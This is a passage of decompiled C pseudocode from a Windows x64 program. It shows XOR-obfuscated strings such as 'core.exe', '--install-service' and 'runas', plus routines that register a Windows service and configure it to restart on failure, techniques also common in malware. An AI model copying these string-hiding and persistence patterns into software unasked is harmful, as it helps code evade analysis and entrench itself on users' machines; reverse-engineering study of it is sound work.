      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v62 + 8i64))(v62);
      if ( !_InterlockedDecrement(v62 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v62 + 16i64))(v62);
    }
  }
  if ( v102 >= 8 )
    operator delete(v100);
  v102 = 7i64;
  v101 = 0i64;
  LOWORD(v100) = 0;
  if ( v64 )
  {
    if ( !_InterlockedDecrement(v64 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v64 + 8i64))(v64);
      if ( !_InterlockedDecrement(v64 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v64 + 16i64))(v64);
    }
  }
  return v3;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);
// 1400A2D38: using guessed type __int64 (__fastcall *off_1400A2D38)();
// 1400A2D48: using guessed type __int64 (__fastcall *off_1400A2D48)();
// 1400A2D60: using guessed type __int64 (__fastcall *off_1400A2D60)();
// 140008900: using guessed type char Dst[8];

//----- (00000001400091F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400091F0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D99C4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D99C4 & 1 )
  {
    v5 = byte_1400D99C0;
  }
  else
  {
    v4 = 69069 * dword_1400D99B4 + 1234567;
    v1 = dword_1400D99C4 | 1;
    dword_1400D99B4 = v4;
    dword_1400D99C4 |= 1u;
    dword_1400D99AC = HIWORD(dword_1400D99AC) + 36969 * (unsigned __int16)dword_1400D99AC;
    LOBYTE(v4) = (BYTE2(dword_1400D99BC) + 80 * dword_1400D99BC) ^ v4;
    dword_1400D99BC = HIWORD(dword_1400D99BC) + 18000 * (unsigned __int16)dword_1400D99BC;
    v5 = (((unsigned int)dword_1400D99B0 >> 13) ^ 32 * dword_1400D99B0 ^ dword_1400D99B0) + v4;
    dword_1400D99B0 ^= ((unsigned int)dword_1400D99B0 >> 13) ^ 32 * (dword_1400D99B0 ^ (dword_1400D99B0 << 12));
    byte_1400D99C0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D99C4 = v1 | 2;
    byte_1400D99C8[0] = v5 ^ 0x66;
    byte_1400D99C9 = (v5 - 1) ^ 0x65;
    byte_1400D99CA = (v5 - 2) ^ 0x61;
    byte_1400D99CB = (v5 - 3) ^ 0x74;
    byte_1400D99CC = (v5 - 4) ^ 0x75;
    byte_1400D99CD = (v5 - 5) ^ 0x72;
    byte_1400D99CE = (v5 - 6) ^ 0x65;
    byte_1400D99CF = (v5 - 7) ^ 0x73;
    byte_1400D99D0 = (v5 - 8) ^ 0x2E;
    byte_1400D99D1 = (v5 - 9) ^ 0x64;
    byte_1400D99D2 = (v5 - 10) ^ 0x61;
    byte_1400D99D3 = (v5 - 11) ^ 0x74;
    byte_1400D99D4 = (v5 - 12) ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400D99C0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D99C8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400D99AC: using guessed type int dword_1400D99AC;
// 1400D99B0: using guessed type int dword_1400D99B0;
// 1400D99B4: using guessed type int dword_1400D99B4;
// 1400D99BC: using guessed type int dword_1400D99BC;
// 1400D99C0: using guessed type char byte_1400D99C0;
// 1400D99C4: using guessed type int dword_1400D99C4;
// 1400D99C9: using guessed type char byte_1400D99C9;
// 1400D99CA: using guessed type char byte_1400D99CA;
// 1400D99CB: using guessed type char byte_1400D99CB;
// 1400D99CC: using guessed type char byte_1400D99CC;
// 1400D99CD: using guessed type char byte_1400D99CD;
// 1400D99CE: using guessed type char byte_1400D99CE;
// 1400D99CF: using guessed type char byte_1400D99CF;
// 1400D99D0: using guessed type char byte_1400D99D0;
// 1400D99D1: using guessed type char byte_1400D99D1;
// 1400D99D2: using guessed type char byte_1400D99D2;
// 1400D99D3: using guessed type char byte_1400D99D3;
// 1400D99D4: using guessed type char byte_1400D99D4;

//----- (0000000140009400) ----------------------------------------------------
void __fastcall sub_140009400(__int64 a1)
{
  _QWORD *v1; // rdi
  volatile signed __int32 *v2; // rbx

  v1 = *(_QWORD **)(a1 + 16);
  if ( v1 )
  {
    v2 = (volatile signed __int32 *)v1[2];
    if ( v2 && !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
    operator delete(v1);
  }
}

//----- (0000000140009460) ----------------------------------------------------
__int64 __fastcall sub_140009460(__int64 a1)
{
  __int64 (__fastcall ***v1)(_QWORD, signed __int64); // rcx
  __int64 result; // rax

  v1 = *(__int64 (__fastcall ****)(_QWORD, signed __int64))(a1 + 16);
  if ( v1 )
    result = (**v1)(v1, 1i64);
  return result;
}

//----- (0000000140009480) ----------------------------------------------------
__int64 sub_140009480()
{
  return 0i64;
}

//----- (00000001400094A0) ----------------------------------------------------
__int64 sub_1400094A0()
{
  SC_HANDLE v0; // rbx
  unsigned __int8 v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rdi
  __int64 Info; // [rsp+20h] [rbp-68h]
  __int64 v6; // [rsp+28h] [rbp-60h]
  __int64 v7; // [rsp+30h] [rbp-58h]
  __int64 v8; // [rsp+38h] [rbp-50h]
  __int64 *v9; // [rsp+40h] [rbp-48h]
  SC_HANDLE v10; // [rsp+48h] [rbp-40h]
  SC_HANDLE v11; // [rsp+50h] [rbp-38h]
  __int64 v12; // [rsp+58h] [rbp-30h]
  __int64 v13; // [rsp+60h] [rbp-28h]
  __int64 v14; // [rsp+68h] [rbp-20h]
  __int64 v15; // [rsp+70h] [rbp-18h]

  v12 = -2i64;
  v0 = OpenSCManagerW(0i64, 0i64, 0xF003Fu);
  v11 = v0;
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 0xF01FFu);
    v10 = v3;
    if ( !v3 )
      goto LABEL_14;
    v13 = 1i64;
    v14 = 1i64;
    v15 = 1i64;
    Info = 0i64;
    v8 = 0i64;
    LODWORD(Info) = 86400;
    v7 = 0i64;
    v6 = 0i64;
    LODWORD(v8) = 3;
    v9 = &v13;
    if ( ChangeServiceConfig2W(v3, 2u, &Info) )
      v1 = 1;
    else
LABEL_14:
      v1 = 0;
    if ( v3 )
      CloseServiceHandle(v3);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}

//----- (00000001400095F0) ----------------------------------------------------
_BOOL8 sub_1400095F0()
{
  SC_HANDLE v0; // rbx
  bool v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rdi
  __int64 Info; // [rsp+28h] [rbp-30h]
  __int64 v6; // [rsp+30h] [rbp-28h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  __int64 v8; // [rsp+40h] [rbp-18h]
  __int64 v9; // [rsp+48h] [rbp-10h]

  v0 = OpenSCManagerW(0i64, 0i64, 0xF003Fu);
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 0xF01FFu);
    v1 = 0;
    if ( v3 )
    {
      Info = 0i64;
      v8 = 0i64;
      LODWORD(Info) = 86400;
      v7 = 0i64;
      v6 = 0i64;
      LODWORD(v8) = 0;
      v9 = 0i64;
      if ( ChangeServiceConfig2W(v3, 2u, &Info) )
        v1 = 1;
    }
    if ( v3 )
      CloseServiceHandle(v3);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}

//----- (00000001400096E0) ----------------------------------------------------
char sub_1400096E0()
{
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [rsp+20h] [rbp-28h]
  __int64 v2; // [rsp+30h] [rbp-18h]
  __int64 v3; // [rsp+38h] [rbp-10h]

  ServiceStartTable.lpServiceName = sub_14000A190();
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_14000AD10;
  v2 = 0i64;
  v3 = 0i64;
  if ( StartServiceCtrlDispatcherA(&ServiceStartTable) != 1 )
    return 0;
  if ( byte_1400D99D8 )
    return sub_14000B010();
  return 1;
}
// 1400D99D8: using guessed type char byte_1400D99D8;

//----- (0000000140009740) ----------------------------------------------------
_QWORD *__fastcall sub_140009740(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9A54;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9A54 & 1 )
  {
    v5 = byte_1400D9A50;
  }
  else
  {
    v4 = 69069 * dword_1400D9A38 + 1234567;
    v1 = dword_1400D9A54 | 1;
    dword_1400D9A38 = v4;
    dword_1400D9A54 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v4;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v5 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v4;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9A50 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9A54 = v1 | 2;
    byte_1400D9A58[0] = v5 ^ 0x41;
    byte_1400D9A59 = (v5 - 1) ^ 0x63;
    byte_1400D9A5A = (v5 - 2) ^ 0x74;
    byte_1400D9A5B = (v5 - 3) ^ 0x69;
    byte_1400D9A5C = (v5 - 4) ^ 0x6F;
    byte_1400D9A5D = (v5 - 5) ^ 0x6E;
    byte_1400D9A5E = (v5 - 6) ^ 0x4D;
    byte_1400D9A5F = (v5 - 7) ^ 0x65;
    byte_1400D9A60 = (v5 - 8) ^ 0x73;
    byte_1400D9A61 = (v5 - 9) ^ 0x73;
    byte_1400D9A62 = (v5 - 10) ^ 0x61;
    byte_1400D9A63 = (v5 - 11) ^ 0x67;
    byte_1400D9A64 = (v5 - 12) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400D9A50;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9A58[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9A50: using guessed type char byte_1400D9A50;
// 1400D9A54: using guessed type int dword_1400D9A54;
// 1400D9A59: using guessed type char byte_1400D9A59;
// 1400D9A5A: using guessed type char byte_1400D9A5A;
// 1400D9A5B: using guessed type char byte_1400D9A5B;
// 1400D9A5C: using guessed type char byte_1400D9A5C;
// 1400D9A5D: using guessed type char byte_1400D9A5D;
// 1400D9A5E: using guessed type char byte_1400D9A5E;
// 1400D9A5F: using guessed type char byte_1400D9A5F;
// 1400D9A60: using guessed type char byte_1400D9A60;
// 1400D9A61: using guessed type char byte_1400D9A61;
// 1400D9A62: using guessed type char byte_1400D9A62;
// 1400D9A63: using guessed type char byte_1400D9A63;
// 1400D9A64: using guessed type char byte_1400D9A64;

//----- (0000000140009950) ----------------------------------------------------
_QWORD *__fastcall sub_140009950(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9AA4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9AA4 & 1 )
  {
    v5 = byte_1400D9AA2;
  }
  else
  {
    v4 = 69069 * dword_1400D9A38 + 1234567;
    v1 = dword_1400D9AA4 | 1;
    dword_1400D9A38 = v4;
    dword_1400D9AA4 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v4;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v5 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v4;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9AA2 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9AA4 = v1 | 2;
    byte_1400D9AA8[0] = v5 ^ 0x63;
    byte_1400D9AA9 = (v5 - 1) ^ 0x6F;
    byte_1400D9AAA = (v5 - 2) ^ 0x72;
    byte_1400D9AAB = (v5 - 3) ^ 0x65;
    byte_1400D9AAC = (v5 - 4) ^ 0x2E;
    byte_1400D9AAD = (v5 - 5) ^ 0x65;
    byte_1400D9AAE = (v5 - 6) ^ 0x78;
    byte_1400D9AAF = (v5 - 7) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400D9AA2;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9AA8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9AA2: using guessed type char byte_1400D9AA2;
// 1400D9AA4: using guessed type int dword_1400D9AA4;
// 1400D9AA9: using guessed type char byte_1400D9AA9;
// 1400D9AAA: using guessed type char byte_1400D9AAA;
// 1400D9AAB: using guessed type char byte_1400D9AAB;
// 1400D9AAC: using guessed type char byte_1400D9AAC;
// 1400D9AAD: using guessed type char byte_1400D9AAD;
// 1400D9AAE: using guessed type char byte_1400D9AAE;
// 1400D9AAF: using guessed type char byte_1400D9AAF;

//----- (0000000140009B20) ----------------------------------------------------
_DWORD *__fastcall sub_140009B20(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9AB4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9AB4 & 1 )
  {
    v5 = byte_1400D9AB0;
  }
  else
  {
    v4 = 69069 * dword_1400D9A38 + 1234567;
    v1 = dword_1400D9AB4 | 1;
    dword_1400D9A38 = v4;
    dword_1400D9AB4 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v4;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v5 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v4;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9AB0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9AB4 = v1 | 2;
    byte_1400D9AB8[0] = v5 ^ 0x63;
    byte_1400D9AB9 = (v5 - 1) ^ 0x6F;
    byte_1400D9ABA = (v5 - 2) ^ 0x72;
    byte_1400D9ABB = (v5 - 3) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
  {
    sub_140004790(Src, 4ui64, 0i64);
    v5 = byte_1400D9AB0;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400D9AB8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9AB0: using guessed type char byte_1400D9AB0;
// 1400D9AB4: using guessed type int dword_1400D9AB4;
// 1400D9AB9: using guessed type char byte_1400D9AB9;
// 1400D9ABA: using guessed type char byte_1400D9ABA;
// 1400D9ABB: using guessed type char byte_1400D9ABB;

//----- (0000000140009CC0) ----------------------------------------------------
char *sub_140009CC0()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400D9AC0;
  if ( dword_1400D9AC0 & 1 )
  {
    v2 = byte_1400D9ABC;
  }
  else
  {
    v1 = 69069 * dword_1400D9A38 + 1234567;
    v0 = dword_1400D9AC0 | 1;
    dword_1400D9A38 = v1;
    dword_1400D9AC0 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v1) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v1;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v2 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v1;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9ABC = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400D9AC0 = v0 | 2;
    byte_1400D9AC8[0] = v2 ^ 0x2D;
    byte_1400D9AC9 = (v2 - 1) ^ 0x2D;
    byte_1400D9ACA = (v2 - 2) ^ 0x69;
    byte_1400D9ACB = (v2 - 3) ^ 0x6E;
    byte_1400D9ACC = (v2 - 4) ^ 0x73;
    byte_1400D9ACD = (v2 - 5) ^ 0x74;
    byte_1400D9ACE = (v2 - 6) ^ 0x61;
    byte_1400D9ACF = (v2 - 7) ^ 0x6C;
    byte_1400D9AD0 = (v2 - 8) ^ 0x6C;
    byte_1400D9AD1 = (v2 - 9) ^ 0x2D;
    byte_1400D9AD2 = (v2 - 10) ^ 0x73;
    byte_1400D9AD3 = (v2 - 11) ^ 0x65;
    byte_1400D9AD4 = (v2 - 12) ^ 0x72;
    byte_1400D9AD5 = (v2 - 13) ^ 0x76;
    byte_1400D9AD6 = (v2 - 14) ^ 0x69;
    byte_1400D9AD7 = (v2 - 15) ^ 0x63;
    byte_1400D9AD8 = (v2 - 16) ^ 0x65;
  }
  result = byte_1400D9AE0;
  if ( !byte_1400D9AE0[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400D9AC8[v5++];
      v7 = v2 - v4++;
      byte_1400D9AE0[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x11 );
  }
  return result;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9ABC: using guessed type char byte_1400D9ABC;
// 1400D9AC0: using guessed type int dword_1400D9AC0;
// 1400D9AC9: using guessed type char byte_1400D9AC9;
// 1400D9ACA: using guessed type char byte_1400D9ACA;
// 1400D9ACB: using guessed type char byte_1400D9ACB;
// 1400D9ACC: using guessed type char byte_1400D9ACC;
// 1400D9ACD: using guessed type char byte_1400D9ACD;
// 1400D9ACE: using guessed type char byte_1400D9ACE;
// 1400D9ACF: using guessed type char byte_1400D9ACF;
// 1400D9AD0: using guessed type char byte_1400D9AD0;
// 1400D9AD1: using guessed type char byte_1400D9AD1;
// 1400D9AD2: using guessed type char byte_1400D9AD2;
// 1400D9AD3: using guessed type char byte_1400D9AD3;
// 1400D9AD4: using guessed type char byte_1400D9AD4;
// 1400D9AD5: using guessed type char byte_1400D9AD5;
// 1400D9AD6: using guessed type char byte_1400D9AD6;
// 1400D9AD7: using guessed type char byte_1400D9AD7;
// 1400D9AD8: using guessed type char byte_1400D9AD8;

//----- (0000000140009E90) ----------------------------------------------------
char *sub_140009E90()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400D9AF4;
  if ( dword_1400D9AF4 & 1 )
  {
    v2 = byte_1400D9AF2;
  }
  else
  {
    v1 = 69069 * dword_1400D9A38 + 1234567;
    v0 = dword_1400D9AF4 | 1;
    dword_1400D9A38 = v1;
    dword_1400D9AF4 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v1) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v1;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v2 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v1;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9AF2 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400D9AF4 = v0 | 2;
    byte_1400D9AF8[0] = v2 ^ 0x72;
    byte_1400D9AF9 = (v2 - 1) ^ 0x75;
    byte_1400D9AFA = (v2 - 2) ^ 0x6E;
    byte_1400D9AFB = (v2 - 3) ^ 0x61;
    byte_1400D9AFC = (v2 - 4) ^ 0x73;
  }
  result = byte_1400D9B00;
  if ( !byte_1400D9B00[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400D9AF8[v5++];
      v7 = v2 - v4++;
      byte_1400D9B00[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 5 );
  }
  return result;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9AF2: using guessed type char byte_1400D9AF2;
// 1400D9AF4: using guessed type int dword_1400D9AF4;
// 1400D9AF9: using guessed type char byte_1400D9AF9;
// 1400D9AFA: using guessed type char byte_1400D9AFA;
// 1400D9AFB: using guessed type char byte_1400D9AFB;
// 1400D9AFC: using guessed type char byte_1400D9AFC;

//----- (0000000140009FC0) ----------------------------------------------------
_QWORD *__fastcall sub_140009FC0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9A68;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9A68 & 1 )
  {
    v5 = byte_1400D9A65;
  }
  else
  {
    v4 = 69069 * dword_1400D9A38 + 1234567;
    v1 = dword_1400D9A68 | 1;
    dword_1400D9A38 = v4;
    dword_1400D9A68 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v4;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v5 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v4;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9A65 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9A68 = v1 | 2;
    byte_1400D9A6C[0] = v5 ^ 0x73;
    byte_1400D9A6D = (v5 - 1) ^ 0x65;
    byte_1400D9A6E = (v5 - 2) ^ 0x72;
    byte_1400D9A6F = (v5 - 3) ^ 0x76;
    byte_1400D9A70 = (v5 - 4) ^ 0x69;
    byte_1400D9A72 = (v5 - 6) ^ 0x65;
    byte_1400D9A71 = (v5 - 5) ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
    sub_140004790(Src, 7ui64, 0i64);
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9A6C[v9++];
    v12 = byte_1400D9A65 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9A65: using guessed type char byte_1400D9A65;
// 1400D9A68: using guessed type int dword_1400D9A68;
// 1400D9A6D: using guessed type char byte_1400D9A6D;
// 1400D9A6E: using guessed type char byte_1400D9A6E;
// 1400D9A6F: using guessed type char byte_1400D9A6F;
// 1400D9A70: using guessed type char byte_1400D9A70;
// 1400D9A71: using guessed type char byte_1400D9A71;
// 1400D9A72: using guessed type char byte_1400D9A72;

